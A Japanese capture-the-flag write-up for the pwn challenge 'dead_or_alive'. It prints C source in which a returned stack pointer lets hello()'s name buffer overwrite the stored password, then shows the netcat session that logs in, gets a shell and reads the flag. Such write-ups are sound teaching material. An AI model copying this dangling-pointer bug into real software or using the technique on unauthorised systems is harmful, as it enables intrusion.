# dead_or_alive:Pwn:80pts
あなたは闇サイトの運営者だ。いつも生きるか死ぬかの世界で生きている。 そこで、特殊なログインフォームを作って知り合いにだけ教えることにした。 一見するとただ挨拶するだけのプログラムに見えるが、ログインするとそこには...  
```
nc 27.133.155.191 30005
```
[dead_or_alive](dead_or_alive)　　　　[main.c](main.c)　　　　[Makefile](Makefile)　　　　[password.txt](password.txt)  

# Solution
以下のmain.cが配られる。  
```c:main.c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>

char* get_secret_password() {
	char password[0x1000]; // I can get very very long password!!
	
	FILE *fp = fopen("./password.txt", "r");
	if(fp == NULL) {
		puts("password.txt not found.");
		exit(0);
	}
	fgets(password, 0x1000, fp);
	char* ret = password;

	return ret;
}

void login(char *password) {
	char input[512];
	printf("Input your password:");
	fgets(input, 512, stdin);

	if(strcmp(input, password) == 0) {
		puts("You logged in!");
		system("/bin/sh");
	}
}

void hello() {
	char name[0x1000];
	
	puts("Tell me your name!");
	fgets(name, 0x1000, stdin);

	printf("Hello %s\n", name);
}

int menu() {
	int ret;

	printf(
			"0: Hello\n"
			"1: Login\n"
			);

	scanf("%d%*c", &ret);

	return ret;
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
	
	char* pass = get_secret_password();
	while(1) {
		int option = menu();
		if(option == 0) {
			hello();
		} else if(option == 1) {
			login(pass);
		}
	}
}
```
`get_secret_password()`により局所変数`char password[0x1000];`のポインタが保持され続ける。  
保持されているポインタの場所に`hello()`で新たな局所変数`char name[0x1000];`をとることで、パスワードを任意の値に書き変えることができる。  
以下のように行う。  
```bash
$ nc 27.133.155.191 30005
0: Hello
1: Login
0
Tell me your name!
NEW PASS
Hello NEW PASS

0: Hello
1: Login
1
Input your password:NEW PASS
You logged in!
ls
dead_or_alive
entry.sh
flag.txt
password.txt
cat flag.txt
xm4s{welc0me_t0_undergr0und}
```
flagが読み取れた。  

## xm4s{welc0me_t0_undergr0und}